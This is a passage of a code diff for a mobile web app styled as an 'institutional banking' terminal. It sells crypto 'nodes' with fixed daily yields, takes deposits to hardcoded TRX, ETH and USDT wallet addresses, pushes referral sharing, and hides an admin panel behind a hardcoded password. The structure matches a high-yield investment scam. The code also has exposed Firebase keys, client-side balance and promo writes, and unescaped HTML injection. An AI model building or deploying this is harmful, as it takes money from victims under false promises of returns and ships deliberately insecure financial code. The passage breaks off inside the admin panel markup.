@@ -2,324 +2,314 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS BANKING | Institutional Asset Terminal</title>
+    <title>NEXUS APEX | Institutional Banking</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap');
-        :root { --primary: #0f172a; --accent: #2563eb; --success: #10b981; --error: #ef4444; }
-        body { background: #f8fafc; color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; }
+        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;500;600;700;800&display=swap');
+        :root { --primary: #000000; --accent: #2563eb; --gold: #f59e0b; --bg: #fdfdfd; }
+        body { background: var(--bg); color: #1a1a1a; font-family: 'Manrope', sans-serif; overflow-x: hidden; }
         
-        .card-bank { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); }
-        .btn-bank { background: var(--primary); color: #fff; border-radius: 10px; font-weight: 700; padding: 14px; transition: 0.2s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
-        .btn-bank:active { transform: scale(0.98); }
-        .input-bank { background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 10px; padding: 14px; width: 100%; outline: none; transition: 0.2s; font-size: 14px; }
-        .input-bank:focus { border-color: var(--accent); background: #fff; }
+        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(0,0,0,0.05); border-radius: 24px; }
+        .btn-apex { background: var(--primary); color: #fff; border-radius: 14px; font-weight: 700; padding: 16px; transition: 0.3s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; }
+        .btn-apex:hover { background: #333; transform: translateY(-2px); }
+        .input-apex { background: #f4f4f7; border: 1px solid #eee; border-radius: 14px; padding: 16px; width: 100%; outline: none; transition: 0.2s; font-size: 14px; }
+        .input-apex:focus { background: #fff; border-color: var(--accent); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
         
-        .badge-pending { color: #b45309; background: #fef3c7; padding: 4px 10px; border-radius: 6px; font-size: 10px; font-weight: 800; }
-        .badge-cleared { color: #065f46; background: #dcfce7; padding: 4px 10px; border-radius: 6px; font-size: 10px; font-weight: 800; }
-        .badge-declined { color: #991b1b; background: #fee2e2; padding: 4px 10px; border-radius: 6px; font-size: 10px; font-weight: 800; }
-
-        .nav-link { color: #64748b; font-size: 10px; font-weight: 700; text-align: center; cursor: pointer; transition: 0.2s; }
-        .nav-link.active { color: var(--accent); }
+        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; transition: 0.3s; padding: 8px; }
+        .nav-link.active { color: var(--primary); transform: scale(1.1); }
         
-        .hidden { display: none !important; }
-        #system-lock { position: fixed; inset: 0; background: #fff; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .page-entry { animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .status-tag { padding: 4px 12px; border-radius: 8px; font-size: 10px; font-weight: 800; text-transform: uppercase; }
+        .pending { background: #fff7ed; color: #c2410c; }
+        .cleared { background: #f0fdf4; color: #15803d; }
+        
+        #preloader { position: fixed; inset: 0; background: #fff; z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .shimmer { background: linear-gradient(90deg, #f0f0f0 25%, #f8f8f8 50%, #f0f0f0 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; }
+        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
     </style>
 </head>
 <body>
 
-    <div id="system-lock" class="hidden">
-        <div class="w-14 h-14 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
-        <h2 class="mt-8 text-xl font-extrabold text-slate-900">Infrastructure Security Sync</h2>
-        <p class="text-slate-500 text-xs mt-2 px-8 font-medium">The terminal is currently locked for institutional database optimization. Please wait.</p>
-    </div>
+    <div id="preloader"><div class="w-10 h-10 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div></div>
 
-    <div id="auth-layer" class="min-h-screen flex items-center justify-center p-6 bg-slate-50">
-        <div class="max-w-md w-full">
-            <div class="text-center mb-12">
-                <h1 class="text-3xl font-extrabold tracking-tighter text-slate-900">NEXUS<span class="text-blue-600">BANKING</span></h1>
-                <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[5px] mt-2">Institutional Management Terminal</p>
+    <div id="auth-ui" class="min-h-screen flex items-center justify-center p-8">
+        <div class="max-w-md w-full space-y-12">
+            <div class="text-center">
+                <h1 class="text-3xl font-black tracking-tighter uppercase">Nexus<span class="text-blue-600">Apex</span></h1>
+                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-[6px] mt-2">Institutional Asset Management</p>
             </div>
 
-            <div id="login-form" class="card-bank p-8 space-y-5">
-                <h2 class="text-xs font-bold uppercase text-slate-500 mb-2">Access Credentials</h2>
-                <input type="text" id="user-id" placeholder="Account Identifier" class="input-bank">
-                <input type="password" id="user-key" placeholder="Security Passcode" class="input-bank">
-                <button onclick="executeLogin()" class="btn-bank shadow-lg shadow-blue-500/10">Authorize Access</button>
-                <p class="text-center text-xs font-bold text-slate-400 mt-6 uppercase">New Client? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Establish Account</span></p>
+            <div id="login-box" class="glass-card p-8 space-y-4 shadow-2xl shadow-slate-200">
+                <input type="text" id="l-user" placeholder="Terminal ID" class="input-apex">
+                <input type="password" id="l-pass" placeholder="Security Passcode" class="input-apex">
+                <button onclick="handleLogin()" class="btn-apex">Authorize Access</button>
+                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">First Time? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register Identity</span></p>
             </div>
 
-            <div id="signup-form" class="card-bank p-8 space-y-5 hidden border-t-4 border-blue-600">
-                <h2 class="text-xs font-bold uppercase text-slate-500 mb-2">Identity Creation</h2>
-                <input type="text" id="new-id" placeholder="Desired Username" class="input-bank">
-                <input type="password" id="new-key" placeholder="Set Passcode" class="input-bank">
-                <input type="text" id="ref-id" placeholder="Referral Hash (Optional)" class="input-bank">
-                <button onclick="executeSignup()" class="btn-bank">Initialize Profile</button>
-                <p class="text-center text-xs font-bold text-slate-400 mt-6 uppercase">Member? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Login to Terminal</span></p>
+            <div id="signup-box" class="glass-card p-8 space-y-4 hidden shadow-2xl shadow-slate-200">
+                <input type="text" id="s-user" placeholder="Create Identity" class="input-apex">
+                <input type="password" id="s-pass" placeholder="Security Passcode" class="input-apex">
+                <input type="text" id="s-ref" placeholder="Referral ID (Optional)" class="input-apex">
+                <button onclick="handleSignup()" class="btn-apex">Initialize Profile</button>
+                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">Existing Member? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Return</span></p>
             </div>
         </div>
     </div>
 
-    <div id="main-terminal" class="hidden pb-24">
-        <header class="bg-white/90 backdrop-blur-md border-b border-slate-200 p-5 sticky top-0 z-50 flex justify-between items-center">
+    <div id="dashboard" class="hidden pb-32">
+        <header class="p-6 sticky top-0 z-50 bg-white/70 backdrop-blur-xl border-b border-slate-50 flex justify-between items-center">
             <div class="flex items-center gap-4">
-                <div id="cmd-trigger" class="w-10 h-10 bg-slate-900 text-white rounded-xl flex items-center justify-center font-black">NB</div>
+                <div id="admin-trigger" class="w-12 h-12 bg-black text-white rounded-2xl flex items-center justify-center text-lg font-black italic">A</div>
                 <div>
-                    <p id="display-user" class="text-xs font-black text-slate-900 uppercase tracking-tighter">CLIENT: ---</p>
-                    <p class="text-[9px] font-bold text-emerald-600 uppercase">Tier: Institutional</p>
+                    <p id="nav-user" class="text-sm font-black uppercase text-slate-900 tracking-tighter">Client_---</p>
+                    <p class="text-[9px] font-bold text-blue-600 uppercase italic">Authenticated Session</p>
                 </div>
             </div>
-            <div class="flex gap-4 items-center">
-                <a href="https://t.me/your_official_channel" target="_blank" class="text-blue-600 text-xl"><i class="fa-brands fa-telegram"></i></a>
-                <button onclick="terminateSession()" class="text-slate-400 hover:text-red-500"><i class="fa-solid fa-power-off"></i></button>
-            </div>
+            <button onclick="logout()" class="w-10 h-10 rounded-full bg-slate-50 flex items-center justify-center text-slate-400"><i class="fa-solid fa-arrow-right-from-bracket"></i></button>
         </header>
 
-        <main id="summary-page" class="p-5 space-y-5 page-entry">
-            <div class="card-bank p-8 bg-slate-900 text-white border-none shadow-2xl relative overflow-hidden">
-                <div class="relative z-10">
-                    <p class="text-[10px] font-bold uppercase text-slate-400 tracking-widest">Available Liquidity</p>
-                    <h2 id="balance-val" class="text-4xl font-bold mt-2 tracking-tighter">$0.00</h2>
-                    <div class="mt-10 flex justify-between border-t border-slate-800 pt-6">
+        <main id="page-home" class="p-6 space-y-6">
+            <div class="glass-card p-8 bg-black text-white border-none shadow-2xl relative overflow-hidden">
+                <div class="relative z-10 space-y-8">
+                    <div>
+                        <p class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Total Equity Value</p>
+                        <h2 id="balance-txt" class="text-4xl font-black mt-2 tracking-tighter">$0.00</h2>
+                    </div>
+                    <div class="flex justify-between items-end">
                         <div>
-                            <p class="text-[9px] font-bold text-slate-500 uppercase">Total Settled Yield</p>
-                            <p id="profit-val" class="text-2xl font-bold text-emerald-400">+$0.00</p>
+                            <p class="text-[9px] font-bold text-slate-500 uppercase">24H Net Yield</p>
+                            <p id="profit-txt" class="text-2xl font-bold text-emerald-400">+$0.00</p>
                         </div>
-                        <button onclick="shareLink()" class="bg-white/10 hover:bg-white/20 text-white px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-tighter self-end">Share Terminal</button>
+                        <button onclick="copyRef()" class="bg-blue-600 px-6 py-2 rounded-xl text-[10px] font-black uppercase">Share Portal</button>
                     </div>
                 </div>
-                <div class="absolute -right-10 -top-10 w-40 h-40 bg-blue-600/10 rounded-full blur-3xl"></div>
+                <div class="absolute -right-20 -bottom-20 w-60 h-60 bg-blue-600/20 rounded-full blur-[100px]"></div>
             </div>
-            
-            <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-[3px] ml-1 pt-4">Infrastructure Nodes</h3>
-            <div id="active-nodes" class="space-y-3"></div>
-        </main>
 
-        <main id="market-page" class="p-5 space-y-6 hidden page-entry">
-            <div class="flex items-center justify-between">
-                <h3 class="text-xs font-black text-slate-900 uppercase tracking-widest border-l-4 border-blue-600 pl-3">Sovereign Asset Nodes</h3>
+            <div class="glass-card p-6 flex gap-3">
+                <input type="text" id="promo-val" placeholder="Enter Institutional Code" class="input-apex !py-3 !text-xs font-bold flex-1">
+                <button onclick="applyPromo()" class="bg-black text-white px-6 py-3 rounded-xl text-[10px] font-black uppercase">Apply</button>
             </div>
-            <div id="elite-grid" class="grid gap-4"></div>
-            
-            <h3 class="text-xs font-black text-slate-900 uppercase tracking-widest border-l-4 border-slate-300 pl-3 mt-8">Retail Asset Nodes</h3>
-            <div id="retail-grid" class="grid gap-4"></div>
+
+            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[3px] ml-2 mt-8">Active Protocols</h3>
+            <div id="active-nodes-list" class="space-y-4"></div>
         </main>
 
-        <main id="ledger-page" class="p-5 space-y-4 hidden page-entry">
-            <h3 class="text-xs font-black text-slate-900 uppercase tracking-widest">Transaction Statement</h3>
-            <div id="ledger-list" class="space-y-2"></div>
+        <main id="page-market" class="p-6 space-y-6 hidden">
+            <h3 class="text-sm font-black uppercase border-l-4 border-blue-600 pl-4">Tier-1 Assets</h3>
+            <div id="elite-nodes" class="grid gap-4"></div>
+            <h3 class="text-sm font-black uppercase border-l-4 border-slate-200 pl-4 mt-8">Institutional Liquidity</h3>
+            <div id="normal-nodes" class="grid gap-4"></div>
         </main>
 
-        <main id="vault-page" class="p-5 space-y-5 hidden page-entry">
-            <div class="card-bank p-6 space-y-5">
-                <h3 class="text-xs font-black uppercase text-slate-900">Capital Deposit</h3>
-                <select id="asset-type" class="input-bank font-bold" onchange="toggleAssetUI()">
+        <main id="page-vault" class="p-6 space-y-6 hidden">
+            <div class="glass-card p-8 space-y-6">
+                <h3 class="text-xs font-black uppercase tracking-widest">Inbound Transfer</h3>
+                <select id="dep-method" class="input-apex font-black" onchange="updateDepUI()">
                     <option value="">Select Asset Network</option>
-                    <option value="USDT_TRC20">USDT (TRC20)</option>
-                    <option value="TRX">TRX (TRON)</option>
+                    <option value="TRX">TRX (Trust Wallet)</option>
+                    <option value="ETH">ETH (Metamask)</option>
+                    <option value="USDT">USDT (Binance TRC20)</option>
                 </select>
-                <div id="asset-ui" class="hidden space-y-4 border-t border-slate-100 pt-5">
-                    <div class="bg-slate-50 p-4 rounded-xl text-center border border-slate-200">
-                        <p class="text-[9px] font-bold text-slate-400 uppercase mb-1">Target Address</p>
-                        <p id="target-addr" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
+                <div id="dep-details" class="hidden space-y-5 border-t pt-6">
+                    <div class="bg-slate-50 p-5 rounded-2xl border border-slate-100 text-center">
+                        <p id="dep-addr" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
                     </div>
-                    <input type="number" id="asset-amt" placeholder="Deposit Amount ($)" class="input-bank">
-                    <input type="text" id="asset-tid" placeholder="Transaction Hash / ID" class="input-bank">
-                    <div class="p-4 border-2 border-dashed border-slate-200 rounded-xl">
-                        <input type="file" id="asset-proof" class="text-xs font-bold text-slate-500">
-                        <p class="text-[8px] font-bold text-slate-400 mt-2 uppercase">Upload Proof (Max 2MB)</p>
-                    </div>
-                    <button onclick="commitDeposit()" class="btn-bank shadow-xl shadow-blue-600/20">Submit for Audit</button>
+                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-apex">
+                    <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-apex">
+                    <input type="file" id="dep-proof" class="text-[10px] font-black">
+                    <button onclick="submitDeposit()" class="btn-apex">Finalize Transfer</button>
                 </div>
             </div>
 
-            <div class="card-bank p-6 space-y-5">
-                <h3 class="text-xs font-black uppercase text-slate-900">Capital Withdrawal</h3>
-                <input type="number" id="with-amt" placeholder="Amount to Egress ($)" class="input-bank">
-                <input type="text" id="with-addr" placeholder="Destination Wallet Address" class="input-bank">
-                <button onclick="commitWithdrawal()" class="btn-bank !bg-slate-700">Request Payout</button>
+            <div class="glass-card p-8 space-y-6">
+                <h3 class="text-xs font-black uppercase tracking-widest">Outbound Egress</h3>
+                <select id="with-method" class="input-apex font-black">
+                    <option value="">Select Destination Gateway</option>
+                    <option value="Binance">Binance Terminal</option>
+                    <option value="Trust">Trust Wallet</option>
+                    <option value="Metamask">Metamask Pro</option>
+                    <option value="OKX">OKX Institutional</option>
+                    <option value="ByBit">ByBit Finance</option>
+                    <option value="Coinbase">Coinbase Wallet</option>
+                    <option value="Wire">Direct Bank Wire</option>
+                </select>
+                <input type="number" id="w-amt" placeholder="Payout Amount ($)" class="input-apex">
+                <input type="text" id="w-addr" placeholder="Destination Address" class="input-apex">
+                <button onclick="submitWithdrawal()" class="btn-apex !bg-slate-800">Execute Payout</button>
             </div>
         </main>
 
-        <main id="corp-page" class="p-5 space-y-5 hidden page-entry">
-            <div class="card-bank p-6">
-                <h3 class="text-xs font-black text-slate-900 uppercase mb-4 tracking-widest">Support & Community</h3>
-                <p class="text-xs text-slate-500 leading-relaxed mb-6">Access official documentation, node audit reports, and live protocol status via our institutional Telegram.</p>
-                <a href="https://t.me/your_official_channel" target="_blank" class="btn-bank block text-center !bg-[#24A1DE] py-4">Join Telegram Channel</a>
-            </div>
-            <div class="card-bank p-6">
-                <h3 class="text-xs font-black text-slate-900 uppercase mb-4 tracking-widest">Legal & Privacy</h3>
-                <div class="space-y-5">
-                    <div class="text-xs">
-                        <p class="font-bold text-slate-800">1. Data Encryption</p>
-                        <p class="text-slate-500 mt-1">All terminal actions are hashed via end-to-end encryption protocols.</p>
-                    </div>
-                    <div class="text-xs">
-                        <p class="font-bold text-slate-800">2. Capital Safety</p>
-                        <p class="text-slate-500 mt-1">Capital is managed within segregated liquidity pools for node stability.</p>
-                    </div>
-                </div>
-            </div>
+        <main id="page-history" class="p-6 space-y-4 hidden">
+            <h3 class="text-xs font-black uppercase tracking-widest">Settlement Statement</h3>
+            <div id="history-list" class="space-y-3"></div>
         </main>
 
-        <nav class="fixed bottom-0 left-0 right-0 bg-white/90 backdrop-blur-2xl border-t border-slate-200 p-4 flex justify-around items-center z-50">
-            <div onclick="route('summary')" class="nav-link active"><i class="fa-solid fa-grid-2 text-xl"></i><p class="mt-1">Home</p></div>
-            <div onclick="route('market')" class="nav-link"><i class="fa-solid fa-layer-group text-xl"></i><p class="mt-1">Nodes</p></div>
-            <div onclick="route('ledger')" class="nav-link"><i class="fa-solid fa-receipt text-xl"></i><p class="mt-1">Ledger</p></div>
-            <div onclick="route('vault')" class="nav-link"><i class="fa-solid fa-vault text-xl"></i><p class="mt-1">Vault</p></div>
-            <div onclick="route('corp')" class="nav-link"><i class="fa-solid fa-building text-xl"></i><p class="mt-1">Corp</p></div>
+        <nav class="fixed bottom-8 left-6 right-6 h-20 glass-card shadow-2xl flex justify-around items-center px-4 z-[100]">
+            <div onclick="switchPage('home')" class="nav-link active"><i class="fa-solid fa-compass text-2xl"></i><p>Terminal</p></div>
+            <div onclick="switchPage('market')" class="nav-link"><i class="fa-solid fa-vault text-2xl"></i><p>Assets</p></div>
+            <div onclick="switchPage('vault')" class="nav-link"><i class="fa-solid fa-paper-plane text-2xl"></i><p>Transfer</p></div>
+            <div onclick="switchPage('history')" class="nav-link"><i class="fa-solid fa-list-check text-2xl"></i><p>Ledger</p></div>
         </nav>
     </div>
 
-    <div id="cmd-console" class="fixed inset-0 bg-white z-[10000] p-6 hidden overflow-y-auto">
-        <div class="flex justify-between items-center mb-8 border-b pb-5">
-            <h2 class="text-sm font-black text-slate-900 uppercase tracking-widest">Master Console</h2>
-            <button onclick="document.getElementById('cmd-console').classList.add('hidden')" class="text-4xl text-slate-300">&times;</button>
+    <div id="admin-panel" class="fixed inset-0 bg-white z-[10000] p-8 hidden overflow-y-auto">
+        <div class="flex justify-between items-center mb-12 border-b pb-6">
+            <h2 class="text-sm font-black uppercase tracking-[4px]">System Infrastructure</h2>
+            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button>
         </div>
-        <button id="main-btn" onclick="toggleSystemLock()" class="btn-bank mb-10">System Lock: OFF</button>
-        <div id="pending-audits" class="space-y-4"></div>
+        <div id="admin-requests" class="space-y-6"></div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        // CONFIGURATION
         const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
         const nodes = {
-            sovereign: [
-                { id: 501, name: "Sovereign Tier-Alpha", price: 2500, daily: 240, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=300" },
-                { id: 502, name: "Sovereign Tier-Beta", price: 6000, daily: 650, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=300" }
+            elite: [
+                { id: 901, name: "Sovereign Elite Node", price: 3000, daily: 350, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
+                { id: 902, name: "Nexus Omni Protocol", price: 7500, daily: 900, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=400" }
             ],
-            retail: Array.from({length: 6}, (_, i) => ({
-                id: i+1, name: `Node Protocol R-${i+1}`, price: 100 + (i*150), daily: 10 + (i*14), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=300&sig=${i}`
+            standard: Array.from({length: 6}, (_, i) => ({
+                id: i+1, name: `Capital Node v${i+1}`, price: 100 + (i*200), daily: 12 + (i*18), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
             }))
         };
 
         window.onload = () => {
-            renderAssets();
-            trackSystemState();
+            renderPlans();
+            setTimeout(() => document.getElementById('preloader').style.display='none', 1000);
             const u = localStorage.getItem('nexus_user');
-            if(u) initializeTerminal(u);
+            if(u) showTerminal(u);
         };
 
-        function renderAssets() {
-            document.getElementById('elite-grid').innerHTML = nodes.sovereign.map(n => assetUI(n, true)).join('');
-            document.getElementById('retail-grid').innerHTML = nodes.retail.map(n => assetUI(n, false)).join('');
+        function renderPlans() {
+            document.getElementById('elite-nodes').innerHTML = nodes.elite.map(n => nodeUI(n, true)).join('');
+            document.getElementById('normal-nodes').innerHTML = nodes.standard.map(n => nodeUI(n, false)).join('');
         }
 
-        const assetUI = (n, isElite) => `
-            <div class="card-bank overflow-hidden flex items-center h-28">
+        const nodeUI = (n, elite) => `
+            <div class="glass-card overflow-hidden flex items-center h-28 border-none shadow-xl shadow-slate-100">
                 <img src="${n.img}" class="w-28 h-28 object-cover">
-                <div class="px-5 flex-1">
-                    <h4 class="text-[10px] font-black uppercase tracking-tight">${n.name}</h4>
-                    <p class="text-[10px] font-bold text-emerald-600 mt-1">Settlement: $${n.daily}/24h</p>
+                <div class="px-6 flex-1">
+                    <h4 class="text-[11px] font-black uppercase tracking-tight">${n.name}</h4>
+                    <p class="text-[10px] font-bold text-emerald-600 mt-1">24H Settlement: $${n.daily}</p>
                     <div class="flex justify-between items-center mt-3">
                         <span class="text-base font-black">$${n.price}</span>
-                        <button onclick="deployNode(${n.id})" class="bg-slate-900 text-white text-[9px] font-black px-4 py-2 rounded-lg uppercase tracking-wider">Deploy</button>
+                        <button onclick="deploy(${n.id})" class="bg-black text-white text-[9px] font-black px-5 py-2 rounded-xl uppercase">Deploy</button>
                     </div>
                 </div>
             </div>`;
 
-        // TERMINAL OPERATIONS
-        function initializeTerminal(uid) {
-            document.getElementById('auth-layer').classList.add('hidden');
-            document.getElementById('main-terminal').classList.remove('hidden');
-            document.getElementById('display-user').innerText = `CLIENT: ${uid}`;
+        function showTerminal(uid) {
+            document.getElementById('auth-ui').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            document.getElementById('nav-user').innerText = `Client_${uid}`;
             
             onValue(ref(db, `users/${uid}`), (snap) => {
-                const data = snap.val(); if(!data) return;
-                document.getElementById('balance-val').innerText = '$' + (data.balance || 0).toFixed(2);
-                document.getElementById('profit-val').innerText = '+$' + (data.profit || 0).toFixed(2);
+                const d = snap.val(); if(!d) return;
+                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
+                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                 
-                // Active Assets
-                const active = data.nodes ? Object.entries(data.nodes) : [];
-                document.getElementById('active-nodes').innerHTML = active.map(([k, v]) => `
-                    <div class="card-bank p-5 flex justify-between items-center border-l-4 border-blue-600">
-                        <div><p class="text-[10px] font-black uppercase">${v.name}</p><p class="text-[9px] text-slate-400 font-bold uppercase mt-1">Status: Stable Yield</p></div>
+                const active = d.nodes ? Object.entries(d.nodes) : [];
+                document.getElementById('active-nodes-list').innerHTML = active.map(([k, v]) => `
+                    <div class="glass-card p-6 flex justify-between items-center border-l-4 border-blue-600 shadow-xl shadow-slate-50">
+                        <div><p class="text-[11px] font-black uppercase">${v.name}</p><p class="text-[9px] text-slate-400 font-bold uppercase mt-1 tracking-widest">Calculating Yield</p></div>
                         <div class="text-right">
-                            <span class="text-xs font-mono font-bold bg-slate-100 px-3 py-1.5 rounded-lg timer" data-next="${v.nextClaim}">00:00:00</span>
+                            <span class="text-xs font-mono font-black bg-slate-100 px-4 py-2 rounded-xl countdown" data-next="${v.nextClaim}">00:00:00</span>
                         </div>
-                    </div>`).join('') || '<div class="text-center py-10 text-[10px] font-black text-slate-300 uppercase tracking-widest">No Active Deployment</div>';
+                    </div>`).join('') || '<div class="text-center py-20 text-[10px] font-black text-slate-300 uppercase tracking-widest">Protocol Offline</div>';
 
-                // Transaction Ledger
-                const logs = data.history ? Object.entries(data.history).reverse() : [];
-                document.getElementById('ledger-list').innerHTML = logs.map(([k, l]) => `
-                    <div class="card-bank p-4 flex justify-between items-center">
-                        <div><p class="text-[10px] font-black uppercase italic">${l.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${l.date}</p></div>
-                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${parseFloat(l.amount).toFixed(2)}</p><span class="badge-${l.status.toLowerCase()}">${l.status}</span></div>
-                    </div>`).join('') || '<div class="text-center py-10 text-[10px] font-black text-slate-300 uppercase italic">Ledger Clean</div>';
+                const history = d.history ? Object.entries(d.history).reverse() : [];
+                document.getElementById('history-list').innerHTML = history.map(([k, h]) => `
+                    <div class="glass-card p-5 flex justify-between items-center">
+                        <div><p class="text-[11px] font-black uppercase">${h.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${h.date}</p></div>
+                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${h.amount}</p><span class="status-tag ${h.status.toLowerCase()}">${h.status}</span></div>
+                    </div>`).join('');
             });
         }
 
-        // DEPOSIT EXECUTION
-        window.commitDeposit = () => {
-            const proofFile = document.getElementById('asset-proof').files[0];
-            if(!proofFile) return alert("Audit proof required.");
+        window.applyPromo = async () => {
+            const code = document.getElementById('promo-val').value.trim();
+            const codes = { "WELCOME2026": 50, "APEX100": 100, "INVESTOR": 250 };
+            if(codes[code]) {
+                const uid = localStorage.getItem('nexus_user');
+                const s = await get(ref(db, `users/${uid}`));
+                await update(ref(db, `users/${uid}`), { balance: (s.val().balance || 0) + codes[code] });
+                alert(`Promo Applied: $${codes[code]} added to equity.`);
+                document.getElementById('promo-val').value = "";
+            } else alert("Invalid Institutional Code.");
+        };
+
+        window.submitDeposit = () => {
+            const file = document.getElementById('dep-proof').files[0];
             const reader = new FileReader();
-            reader.readAsDataURL(proofFile);
+            if(!file) return alert("Verification file required.");
+            reader.readAsDataURL(file);
             reader.onload = async () => {
                 const uid = localStorage.getItem('nexus_user'), hKey = push(ref(db, 'admin/requests')).key;
-                const payload = { id: hKey, user: uid, amount: document.getElementById('asset-amt').value, tid: document.getElementById('asset-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
-                await set(ref(db, `admin/requests/${hKey}`), payload);
-                await set(ref(db, `users/${uid}/history/${hKey}`), payload);
-                alert("Deposit Logged. Auditing initiated.");
-                route('ledger');
+                const req = { id: hKey, user: uid, amount: document.getElementById('dep-amt').value, tid: document.getElementById('dep-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
+                await set(ref(db, `admin/requests/${hKey}`), req);
+                await set(ref(db, `users/${uid}/history/${hKey}`), req);
+                alert("Audit Initiated. Status will update in Ledger.");
+                switchPage('history');
             };
         };
 
-        // COMMAND CENTER (ADMIN)
-        let taps = 0; document.getElementById('cmd-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Security Key:") === "coin786") { document.getElementById('cmd-console').classList.remove('hidden'); loadAudits(); } taps = 0; } };
+        // CORE UTILS
+        window.switchPage = (p) => { ['home','market','vault','history'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
+        window.updateDepUI = () => {
+            const m = document.getElementById('dep-method').value;
+            const addrs = { 
+                "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76",
+                "ETH": "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355",
+                "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ"
+            };
+            document.getElementById('dep-addr').innerText = addrs[m] || "";
+            document.getElementById('dep-details').classList.remove('hidden');
+        };
 
-        function loadAudits() {
+        // ADMIN TRIGGER
+        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Auth Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
+
+        function loadAdmin() {
             onValue(ref(db, 'admin/requests'), (s) => {
-                const data = s.val();
-                document.getElementById('pending-audits').innerHTML = data ? Object.values(data).map(r => `
-                    <div class="card-bank p-5 space-y-4 shadow-xl">
-                        <div class="flex justify-between font-black text-[10px] uppercase"><span>${r.type} [${r.user}]</span><span>$${r.amount}</span></div>
-                        ${r.proof ? `<img src="${r.proof}" class="w-full h-44 object-cover rounded-xl border border-slate-100">` : ''}
+                const d = s.val();
+                document.getElementById('admin-requests').innerHTML = d ? Object.values(d).map(r => `
+                    <div class="glass-card p-6 space-y-4">
+                        <div class="flex justify-between font-black text-[11px] uppercase"><span>${r.type} [${r.user}]</span><span>$${r.amount}</span></div>
+                        <img src="${r.proof}" class="w-full h-44 object-cover rounded-2xl">
                         <div class="flex gap-2">
